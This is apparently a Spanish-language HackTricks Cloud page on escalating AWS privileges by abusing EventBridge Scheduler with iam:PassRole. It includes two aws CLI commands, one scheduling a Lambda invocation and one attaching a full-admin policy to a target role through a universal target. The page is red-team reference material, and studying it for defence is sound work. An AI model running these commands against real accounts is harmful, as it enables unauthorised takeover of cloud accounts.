# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler se puede utilizar para la escalada de privilegios programando llamadas a varios servicios de AWS. Al aprovechar su capacidad para invocar servicios de manera programada, los usuarios con permisos suficientes pueden escalar privilegios. Aqu칤 hay algunas de las acciones clave que EventBridge Scheduler puede activar utilizando objetivos plantillados:

* Lambda: lambda:InvokeFunction - Invocar funciones Lambda en un horario.
* CodeBuild: codebuild:StartBuild - Iniciar proyectos de AWS CodeBuild.
* CodePipeline: codepipeline:StartPipelineExecution - Activar ejecuciones de AWS CodePipeline.
* ECS: ecs:RunTask - Ejecutar tareas de ECS.
* EventBridge: events:PutEvents - Colocar eventos en EventBridge.
* Inspector: inspector:StartAssessmentRun - Iniciar evaluaciones de Amazon Inspector.
* Kinesis: kinesis:PutRecord - Colocar registros en flujos de Kinesis.
* Firehose: firehose:PutRecord - Colocar registros en flujos de entrega de Firehose.
* SageMaker: sagemaker:StartPipelineExecution - Iniciar ejecuciones de pipeline de SageMaker.
* SNS: sns:Publish - Publicar mensajes en temas de SNS.
* SQS: sqs:SendMessage - Enviar mensajes a colas de SQS.
* Step Functions: states:StartExecution - Iniciar ejecuciones de AWS Step Functions.

Estas son solo algunas de las acciones plantilladas que EventBridge Scheduler puede realizar. Sin embargo, al usar objetivos universales, se pueden invocar muchas otras acciones en los servicios de AWS. Los objetivos universales permiten operaciones API m치s extensas m치s all치 de la lista plantillada.

M치s informaci칩n sobre EventBridge Scheduler en:

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Los usuarios con permisos `sts:AssumeRole`, `iam:PassRole` y `scheduler:CreateSchedule o scheduler:UpdateSchedule` pueden escalar privilegios aprovechando el EventBridge Scheduler para invocar servicios utilizando un rol con privilegios m치s altos.

Con estos permisos, un atacante puede asumir un rol con privilegios elevados y pasar ese rol a EventBridge Scheduler al crear o actualizar un horario. El horario se puede configurar para realizar cualquiera de las acciones listadas anteriormente, como invocar funciones Lambda, iniciar tareas de ECS, activar ejecuciones de CodePipeline, o cualquier operaci칩n de los 270 servicios de AWS soportados por EventBridge Scheduler. Al programar estas acciones, un atacante podr칤a abusar de privilegios m치s altos para realizar operaciones no autorizadas en los servicios de AWS. \\

Por ejemplo, podr칤an configurar el horario para invocar una funci칩n Lambda que es una acci칩n plantillada:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Adem치s de las acciones de servicio en plantilla, puedes usar objetivos universales en EventBridge Scheduler para invocar una amplia gama de operaciones API para muchos servicios de AWS. Los objetivos universales ofrecen flexibilidad para invocar casi cualquier API. Un ejemplo puede ser usar objetivos universales a침adiendo "AdminAccessPolicy", utilizando un rol que tiene la pol칤tica "putRolePolicy":
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Referencias

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
